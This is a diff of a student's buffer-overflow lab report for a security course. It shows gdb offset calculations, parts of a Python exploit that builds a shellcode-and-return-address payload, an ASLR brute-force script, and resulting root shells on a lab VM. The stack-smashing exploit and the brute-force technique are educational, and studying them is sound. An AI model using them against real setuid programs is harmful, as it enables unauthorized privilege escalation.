@@ -1,8 +1,8 @@
-## Lab03
+## Lab03 Buffer Overflow Attack Lab
 ###### Lin Shi (n92s773)
 ###### linshi1768@gmail.com
 ###### CSCI 476
-###### February 16, 2021
+###### March 2, 2021
 <br>
 
 Before the tasks, I followed the environment setup:
@@ -15,7 +15,7 @@ kernel.randomize_va_space = 0
 ### Task 1:
 
 #### Task 1.1:
-In this task, I compiled and ran both a 32-bit version and a 64-bit version shellcode. I compiled them using the makefile that was given to us. Additionally, I realized that if I compiled using the setuid tag, it will convert both of the executables to be a setuid program; thus running as root privilege:
+In this task, I compiled and ran both a 32-bit version and a 64-bit version shellcode. I compiled them using the makefile that was given to us. Additionally, I realized that if I compiled using the setuid tag, it will convert both of the executables to be a setuid program; thus running with root privilege:
 ```
 [03/01/21]seed@VM:~/.../shellcode$ make
 gcc -m32 -z execstack -o a32.out call_shellcode.c
@@ -41,7 +41,7 @@ root
 # whoami                                                                       
 root
 ```
-In both of the setuid and regular program, the 32 and the 64 bit version will have a shell. However, in the regular program, both the executables are executing as seed, where they are executing as root in the setuid program.  Additionally, if we could somehow get the access to the bash without the "permission", we could very well commit some damage.
+In both of the setuid and regular program, the 32 and the 64 bit version will have a shell. However, in the regular program, both the executables are executing as seed, where they are executing as root in the setuid program.
 
 #### Task 1.2:
 The main first initialize a blank char array. Then it uses strcpy to copy the appropriate shellcode definition to the variable code. Looking right above the main function, we can see an if statement that splits the 64-bit shellcode with the 32-bit shellcode. Then it invokes the shellcode from the stack, which resulted in our shell. Looking in the makefile, we can see that -m32 flag will make the file a 32-bit binary and without it is 64-bit binary. Overall, the program, more specifically, the main function, calls the appropriate shell with the proper shellcode.
@@ -71,7 +71,7 @@ gdb-peda$ quit
 We have found our ebp address to be 0xffffcb18, our buffer address to be 0xffffcaac, and offset to be 108. Additionally, we can see our buffer size to be 100.
 
 #### Task 2.2:
-First, I added the appropriate shellcode, the 32 bit version from the call_shellcode program. Second, I included the offset and ret values. The variable offset is the difference between the ebp and buffer plus 4 (108 + 4). The offset will be 4 bytes above the current frame pointer; thus, we must adjust it by 4 bytes. The ret will be the ebp address + some delta, with the example being 0x78 during class. However, after a few guess and check, I realized that the delta starts at the buffer size and you may increase it by a little bit (I think the cap depends on the version of the program you have). Therefore, I used 120. On the other hand, while I was modifying all these inputs, I realized none of my code worked. While I was searching for help, I saw that the code given to us and the example code Travis showed us was different right around variable "start". Therefore, I changed that portion and kept what I modified for offset, ret, and shellcode, which worked just fine. Thus, I have included the whole program this time so it is clear what I modified:
+First, I added the appropriate shellcode, the 32 bit version from the call_shellcode program. Second, I included the offset and ret values. The variable offset is the difference between the ebp and buffer plus 4 (108 + 4). The return address will be 4 bytes above the current frame pointer; thus, we must adjust it by 4 bytes. The ret will be the ebp address + some delta, with the example being 0x78 during class. However, after a few guess and check, I realized that the delta starts at the buffer size and you may increase it by a little bit (I think the cap depends on the version of the program you have, either 32 or 64). Therefore, I used 120. On the other hand, while I was modifying all these inputs, I realized none of my code worked. While I was searching for help, I saw that the code given to us and the example code Travis showed us was different right around variable "start". Therefore, I changed that portion and kept what I modified for offset, ret, and shellcode, which worked just fine. Thus, I have included the whole program this time so it is clear what I modified:
 ```
 #!/usr/bin/python3
 import sys
@@ -103,7 +103,7 @@ content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
 with open('badfile', 'wb') as f:
     f.write(content)
 ```
-After a few test runs, I began to understood, exploit.py will creat a badfile and ./stack will read in the badfile. Thus, we must remove the badfile every time we modify exploit.py:
+Running the commands.
 ```
 [03/01/21]seed@VM:~/.../code$ rm badfile
 [03/01/21]seed@VM:~/.../code$ exploit.py
@@ -135,7 +135,7 @@ $2 = (char (*)[160]) 0xffffcab0
 gdb-peda$ p/d 0xffffcb58 - 0xffffcab0
 $3 = 168
 ```
-I used to gdb to get the offset and ebp value that I will be using for my ret. Then I modified my exploit code. First, I changed the shellcode to the appropriate version. Then I changed the start because of the reason I talked about above. Lastly, I modified offset and ret according to gdb information. However, this time, I tried to fill the most of the NOPs with the correct some return address. Since I discovered in my previous tests that the 32-bit version and 100 buffer space is pretty lenient. On top of that, we know that the buffer size is between 100 and 200, so I decided to set a for loop with size 25 that iterate through while adding 4 each time to cover the memory alignment. Also, I included 200 to ensure that it will not cause any error, I found through my experient, at least with 32-bit versions, that if you do not surpass your offset number, you will like get either segmentation error or illegal instruction.  
+I used to gdb to get the offset and ebp value that I will be using for my ret. Then I modified my exploit code. First, I changed the shellcode to the appropriate version. Then I changed the start because of the reason I talked about above. Lastly, I modified offset and ret according to gdb information. However, this time, I tried to fill the most of the NOPs with the correct some return address. Since I discovered in my previous tests that the 32-bit version and 100 buffer space is pretty lenient. On top of that, we know that the buffer size is between 100 and 200, so I decided to set a for loop with size 25 that iterate through while adding 4 to delta each time to cover the memory alignment. Thus, I was able to do a buffer overflow without "knowing" the buffer size.
 ```
 ...
 shellcode = (
@@ -348,7 +348,7 @@ root
 # id
 uid=0(root) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
 ```
-After 32,688 runs and 24 seconds, we have successfully defeated the ASLR feature.
+After 32,688 runs and 24 seconds, we have successfully defeated the ASLR feature. With enough time and luck, we are able to get passed ASLR with brute-force.
 
 
 ### Task 6:
@@ -429,7 +429,7 @@ $2 = (char (*)[10]) 0x7fffffffd946
 gdb-peda$ p/d 0x7fffffffd950 - 0x7fffffffd946
 $3 = 10
 ```
-Then, with the information, I chose to brute-force it and changed the program that was given to use to better match my situation. Doing the remove the badfile, running the exploit.py by passing in the number as the offset, and run the stack against the badfile. Through this, I was able to find my offset that worked. I named it test-brute-force.sh:
+Then, with the information, I tested a few options, but I was not getting anywhere (Mainly because I am unsure how 64 bit programs are going to act). Then, since brute-force was not eliminated, I chose to brute-force it and changed the program that was given to use to better match my situation. Doing the remove the badfile, running the exploit.py by passing in the number as the offset, and run the stack against the badfile. Through this, I was able to find my offset that worked. I named it test-brute-force.sh:
 ```
 #!/bin/bash
 
@@ -491,4 +491,4 @@ root
 uid=0(root) gid=1000(seed) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
 #
 ```
-In the end, I found the number to be 1046 as delta, which was **way** bigger than I expected. Then given a second thought, since this is a 64-bit version.
+In the end, I found the number to be 1046 as delta, which was **way** bigger than I expected. Then given a second thought, since this is a 64-bit version, it may be different than 32-bit version. Based on the output, we could see that I am running a shell with root privilege. Proving that 64-bit programs are harder to hack, but not impossible.
